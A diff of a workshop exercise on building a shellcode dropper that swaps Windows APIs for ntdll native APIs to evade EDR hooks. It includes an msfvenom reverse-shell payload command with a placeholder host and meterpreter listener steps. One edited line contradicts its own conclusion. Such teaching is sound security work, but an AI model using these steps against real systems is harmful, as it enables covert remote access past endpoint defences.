@@ -1,30 +1,30 @@
 ## Introduction: Exercise 4 Medium_Level_API_Dropper
-In this exercise, we will make the first modification to the reference dropper and replace the Windows APIs (Kernel32.dll) with native APIs (Ntdll.dll).
-We create a **medium-level API shellcode dropper** in short **MLA-dropper** based on native APIs. 
+In this exercise, we will make the first modification to the reference dropper and replace the Windows APIs (kernel32.dll) with native APIs (ntdll.dll).
+We create a **medium-level API shellcode dropper** in short **MLA-Dropper** based on native APIs. 
 ![medium_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235372969-4d24ddec-7ee5-443e-966a-24b3d70dc3a8.png)
 
 
 
-## Workshop tasks: Exercise 4 Medium_Level_API_Dropper
-1. Create a new C++ POC in Visual Studio 2019 and use the provided code for the MLA Dropper.
-2. Create staged x64 meterpreter shellcode with msfvenom and copy it to the C++ MLA Dropper POC. 
-3. Compile the MLA Dropper as release or debug x64. 
+## Exercice 4 tasks: 
+1. Create a new C++ POC in Visual Studio 2019 and use the provided code for the MLA-Dropper.
+2. Create staged x64 meterpreter shellcode with msfvenom and copy it to the C++ MLA-Dropper poc. 
+3. Compile the MLA-Dropper as release or debug x64. 
 4. Create and run a staged x64 meterpreter listener with msfconsole.
 5. Run your compiled .exe and verify that a stable command and control channel opens. 
-6. Use the Visual Studio dumpbin to verify that the Windows APIs are no longer being imported by kernel32.dll. 
-7. Use the API Monitor tool to verify that there are no more transitions from Windows APIs to Native APIs related to the MLA dropper. 
+6. Use the Visual Studio tool dumpbin to verify that the user Windows APIs in the MLA-Dropper are no longer being imported by kernel32.dll. 
+7. Use the API Monitor tool to verify that there are no more transitions from Windows APIs to native APIs related to the MLA-Dropper. 
 8. Use x64 dbg and check where the syscall execution of each used native API comes from ? Module? Location? 
 
 
 ## Visual Studio
 Same procedure as in the high-level API dropper exercise, take a look to follow the necessary steps.
-We replace all Windows APIs with the corresponding native APIs and create our MLA dropper.
+We replace all Windows APIs with the corresponding native APIs and create our MLA-Dropper.
 - NtAllocateVirtualMemory
 - NtWriteVirtualMemory
 - NtCreateThreadEx
 - NtWaitForSingleObject
 
-The code works as follows. Unlike the Windows APIs, most of the Native APIs are not officially or partially documented by Microsoft and are therefore not intended for Windows OS developers. To use the Native APIs in the Medium Level Dropper, we must manually define the function pointers for the Native API functions in the MLA dropper code.
+The code works as follows. Unlike the Windows APIs, most of the native APIs are not officially or partially documented by Microsoft and are therefore not intended for Windows OS developers. To use the native APIs in our MLA-Dropper, we must manually define the function pointers for the native API functions in the MLA-Dropper code.
 <p align="center">
 <img width="726" alt="image" src="https://user-images.githubusercontent.com/50073731/235373833-787137bf-e79b-41a3-b0cb-a83a29c541be.png">
 </p>
@@ -34,32 +34,32 @@ Shellcode declaration same as before in the high-level API dropper.
 <img width="608" alt="image" src="https://user-images.githubusercontent.com/50073731/235367184-71a8dbb0-036b-4cc1-93d2-28ef1abfd9ef.png">
 </p>  
 
-We need to manually load the required native APIs from ntdll.dll.
+To directly access the code of the native APIs used, we need to manually load the required native APIs from ntdll.dll.
 <p align="center">
 <img width="790" alt="image" src="https://user-images.githubusercontent.com/50073731/235374135-eeda7d5a-5a95-40bf-8a58-43e65c90d9c6.png">
 </p>
 
-For memory allocation, we replace the Windows API VirtualAlloc with the native API NtAllocateVirtualMemory.
+For memory allocation, we replace the Windows API VirtualAlloc with the native API **NtAllocateVirtualMemory**.
 <p align="center">
 <img width="741" alt="image" src="https://user-images.githubusercontent.com/50073731/235373720-c004340c-4132-41b7-9494-1d7f0aaea053.png">
 </p>
 
-For shellcode copying, we replace the Windows API WriteProcessMemory with the native API NtWriteVirtualMemory.
+For shellcode copying, we replace the Windows API WriteProcessMemory with the native API **NtWriteVirtualMemory**.
 <p align="center">
 <img width="591" alt="image" src="https://user-images.githubusercontent.com/50073731/235374052-448e1e9d-caf5-4d80-972f-fd0ef70feb95.png">
 </p>
 
-For shellcode execution, we replace the Windows API CreateThread with the native API NtCreateThreadEx.
+For shellcode execution, we replace the Windows API CreateThread with the native API **NtCreateThreadEx**.
 <p align="center">
 <img width="568" alt="image" src="https://user-images.githubusercontent.com/50073731/235374248-fecf50c3-72b9-4f2b-95b3-d0aa86378a79.png">
 </p>
 
-And finally we have to replace the Windows API WaitForSingleObject with the native API NtWaitForSingleObject
+And finally we have to replace the Windows API WaitForSingleObject with the native API **NtWaitForSingleObject**.
 <p align="center">
 <img width="603" alt="image" src="https://user-images.githubusercontent.com/50073731/235374361-df94b5cc-1307-4229-9d54-c83bafe2daac.png">
 </p>
 
-Here is the complete code and you can copy this code to your medium level API POC.
+Here is the complete code, and you can copy and paste this code into your MLA-Dropper project in Visual Studio.
 
 ```
 #include <stdio.h>
@@ -115,8 +115,7 @@ int main() {
 
 
 ## Meterpreter Shellcode
-In this step, we will create our shellcode for the high-level API dropper poc with msfvenom in Kali Linux. To do this, we use the following command and 
-create x64 staged meterpreter shellcode.
+Again, we will create our meterpreter shellcode with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
 ```
@@ -124,14 +123,13 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Ka
 <img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
 </p>
 
-The shellcode can then be copied into the POC by replacing the placeholder at the unsigned char, and the POC can be compiled as a x64 release.
-<p align="center">
+The shellcode can then be copied into the MLA-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
 <img width="596" alt="image" src="https://user-images.githubusercontent.com/50073731/235358159-c43053aa-9a35-4b4e-b627-001b112e6324.png">
 </p>
 
 
 ## MSF-Listener
-Before we test the functionality of our high-level API dropper, we need to create a listener within msfconsole.
+Before we test the functionality of our MLA-Dropper, we need to create a listener within msfconsole.
 
 **kali>**
 ```
@@ -150,7 +148,7 @@ run
 <img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
 </p>
 
-Once the listener has been successfully started, you can run your compiled high_level_dropper.exe. If all goes well, you should see an incoming command and control session 
+Once the listener has been successfully started, you can run your compiled MLA-Dropper. If all goes well, you should see an incoming command and control session. 
 
 <p align="center">
 <img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
@@ -159,19 +157,19 @@ Once the listener has been successfully started, you can run your compiled high_
 
 
 ## MLA-Dropper analysis: Dumpbin tool
-The Visual Studio Dumpbin tool can be used to check which Windows APIs are imported via Kernel32.dll. The following command can be used to check the imports.
+The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports.
 **cmd>**
 ```
 cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
 dumpbin /imports high_level.exe
 ```
-Compared to the high level dropper, you can observe that the medium level dropper no longer imports the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject from kernel32.dll.
+Compared to the high level dropper, you can observe that the medium level dropper **no longer imports** the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject from kernel32.dll. This result was expected and is correct.
 <p align="center">
 <img width="729" alt="image" src="https://user-images.githubusercontent.com/50073731/235374656-117e0468-cd4d-4832-afb7-599cf94d2f1b.png">
 </p>
 
 ## MLA-Dropper analysis: API-Monitor
-Compared to the high-level dropper, you can see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject no longer pass to the four corresponding native APIs. For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and the corresponding native APIs, we can be sure that there are no more transitions. We filter on the following API calls:
+Compared to the high-level dropper, you can see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject no longer pass to the four corresponding native APIs. For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and the corresponding native APIs, we can be sure that there are no more transitions in context of the used APIs in our MLA-Dropper. We filter on the following API calls:
 - VirtualAlloc
 - NtAllocateVirtualMemory
 - WriteProcessMemory
@@ -181,20 +179,20 @@ Compared to the high-level dropper, you can see that the Windows APIs VirtualAll
 - WaitForSingleObject
 - NtWaitForSingleObject
 
-If everything was done correctly, you should no longer transitions from the Windows APIs to the native APIs we used in our medium-level Dropper POC.
-Instead we directly access the native APIs in ntdll.dll
+If everything was done correctly, you could observe that there are more transitions from the Windows APIs to the native APIs we used in our MLA-Dropper poc.
+This result was expected and is correct because our MLA-Dropper accesses or imports the needed native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject directly from ntdll.dll.
 <p align="center">
 <img width="522" alt="image" src="https://user-images.githubusercontent.com/50073731/235374864-c7e90dd6-82c6-49d1-a90c-b80a531416b3.png">
 </p>
 
-## HLA-Dropper analysis: x64dbg 
-Using x64dbg I check from which region of the PE structure of the High Level API dropper the system call for the Native API NtAllocateVirtualMemory is executed. As direct system calls are not yet used in this dropper, the figure shows that the system call is correctly executed from the .text region of Ntdll.dll. This investigation is very important because later in the article I expect a different result with the low level POC and want to match it.
+## MLA-Dropper analysis: x64dbg 
+Using x64dbg we verify from which region in the PE structure of the MLA-Dropper the system calls for the used native APIs are executed. Since direct system calls are not yet used in MLA-Dropper, the figure again shows that the system call is correctly executed from the .text region of ntdll.dll. 
 ![image](https://user-images.githubusercontent.com/50073731/235368598-ad159117-abb5-4b0d-8b52-bea2a162b565.png)
 
 
 ## Summary: Medium-level API Dropper
-- Made transition from high to medium level or from Windows APIs to Native APIs
+- We made the transition from high-level APIs to mid-level APIs, or from Windows APIs to native APIs.
 - But still no direct use of system calls
-- Syscall execution over medium_level_dropper.exe -> ntdll.dll -> syscall
-- Dropper imports no longer Windows APIs from kernel32.dll...
+- Syscall execution via medium_level_dropper.exe -> ntdll.dll -> syscall
+- Dropper no longer imports Windows APIs from kernel32.dll
 - In case of EDR would only hook kernel32.dll -> EDR bypassed 
